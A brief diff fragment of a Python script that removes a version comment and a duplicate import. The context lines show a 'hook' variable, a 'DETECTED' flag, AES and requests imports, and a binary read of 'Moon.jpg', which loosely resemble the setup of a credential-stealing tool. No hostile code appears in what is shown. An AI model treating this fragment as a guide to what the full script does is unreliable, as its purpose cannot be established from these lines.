@@ -15,10 +15,6 @@ import random
 import re
 import subprocess
 
-#  THIS IS 1.1.6 VERSION
-#
-# 
-
 
 hook = "x"
 DETECTED = False
@@ -44,8 +40,6 @@ for modl in requirements:
 
 import requests
 from Crypto.Cipher import AES
-
-import os
 
 with open('Moon.jpg', 'rb') as f:
     content = f.read()
